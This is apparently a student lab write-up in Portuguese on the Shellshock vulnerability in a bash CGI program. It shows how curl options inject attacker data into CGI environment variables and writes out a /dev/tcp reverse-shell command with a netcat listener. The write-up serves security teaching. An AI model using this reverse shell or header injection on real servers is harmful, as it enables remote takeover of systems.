## Task 2: Passing Data to Bash via Environment Variable

Nesta tarefa o objetivo é perceber como podemos aproveitar uma vulnerabilidade shellshock num programa CGI baseado em bash. Para este efeito é necessário passar a nossa informação como atacantes para este programa, utilizando então variáveis de ambiente para o fazer.
Uma maneira de fazer isto é imprimir o conteúdo de todas as variáveis de ambiente no processo atual e perceber que informação do user entra nas variáveis de ambiente de um programa CGI.

A última linha do programa *getenv.cgi* executa esta mesma tarefa.

```

#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ

```


### Task 2.A: Using Browser


A lista de variáveis de ambiente é imprimida pelo servidor:

![browser env](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/envbrowser.png?raw=true)

Quando acedemos ao ficheiro *getenv.cgi* pelo browser a variável de ambiente HTTP_USER_AGENT é definida pelo próprio browser sendo este o próprio User Agent.

Observando através da extensão HTTP header Live Main o pedido HTTP efetuado conseguimos concluir que outras variáveis de ambiente como HTTP_ACCEPT, HTTP_ACCEPT_LANGUAGE, HTTP_ACCEPT_ENCODING, HTTP_ACCEPT_CONNECTION, HTTP_UPGRADE_INSECURE_REQUESTS tem o seu valor definido pelos campos correspondentes no pedido HTTP.


![pedido http](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/httpliveextension.png?raw=true)


### Task 2.A: Using Curl

Tendo como objetivo de definir a informação relativa a variáveis do ambiente para valores arbitrários, o comando **curl** permite aos users manipular campos num pedido HTTP utilizando certas opções.

Nesta tarefa teremos que descobrir quais campos são definidos pelas opções variadas do curl e descrever quais delas podem ser usadas para injetar informção para as variáveis de ambiente de um programa CGI.

Podemos descobrir isto observando a resposta de cada comando curl usando certas opções.

Se a opção ```-v``` estiver especificada então a operação executada é mais legível e é imprimido o cabeçalho do pedido HTTP:

![-v option on curl](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/2_A_curl_v_option.png?raw=true)


Se a opção ```-A``` estiver especificada então o conteúdo do user está especificado na variável de ambiente do servidor, neste caso define User-Agent para "my data":

![-A option on curl](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/2_A_curl_a_option.png?raw=true)

Se a opção ```-e``` estiver especificada então o conteúdo do user está especificado na variável de ambiente do servidor, neste cado define Referer para "my data":

![-e option on curl](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/2_A_curl_e_option.png?raw=true)

Se a opção ```-H``` estiver especificada então o conteúdo do user está especificado na variável de ambiente do servidor, neste caso é incluído no pedido HTTP um novo campo referente a "AAAAAA: BBBBBB" sendo que esta informção é depois incluida nas variáveis de ambiente imprimidas na forma de HTTP_AAAAAA=BBBBBB:

![-H option on curl](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/2_A_curl_h_option.png?raw=true)

Como observamos, existe uma série de variáveis de ambiente, que são valores que um servidor web envia neste caso para o program CGI, que espelham informação sobre o servidor e não são modificadas e outras que dão informação sobre os utilizadores e podem ser modificadas como vimos. Ao usar o comando curl com as opções ```-A``` ```-e``` ```-H``` o atacante pode então injetar o seu próprio conteúdo para as variáveis de ambiente de um programa CGI alvo.

## Task 4: Getting a Reverse Shell via Shellshock Attack


Na tarefa anterior, nós os atacantes corria um comando no servidor e imprimir o resultado. No entanto, no mundo real os atacantes preferem correr um comando shell para que possam correr outros comandos enquanto que o programa shell está a correr.
Para este propósito, uma reverse shell é precisa, um processo shell iniciado numa máquina com o seu input e output controlado por outro utilizador num computador remoto.
O princípio de uma reverse shell é redirecionar o input e output  para uma conexão de rede.

Para executar esta tarefa, é necessário criar um servidor TCP que escuta uma conexão num port especificado, neste caso correr o comando ``` nc -l 9090 ``` para iniciar uma conexão entre o atacante e o servidor pelo port 9090.


De acordo com a secção **4 Guidelines: Creating Reverse Shell** ``` /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1 ``` inicia uma bash shell na máquina do servidor, sendo:

• ``` /bin/bash -i ```: opção i significa interativo, shell interativa.

• ``` > /dev/tcp/10.0.2.15/9090 ```: redireciona *stdout* para a conexão TCP para 10.0.2.15 port 9090.

• ``` 0<&1 ```: Indica que o programa shell tem o seu input vindo da mesma conexão TCP.

• ``` 2>&1 ```: Output de erros é redirecionado para o *stdout*.


Comando Final para concluir o ataque:

![Final Payload](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/commandtoReverseShell.png?raw=true)

Reverse shell criada:

![Final Payload](https://github.com/Fernando-A-Rocha/FEUP-SSI/blob/main/1-Shellshock/Screenshots/listeningNC.png?raw=true)





































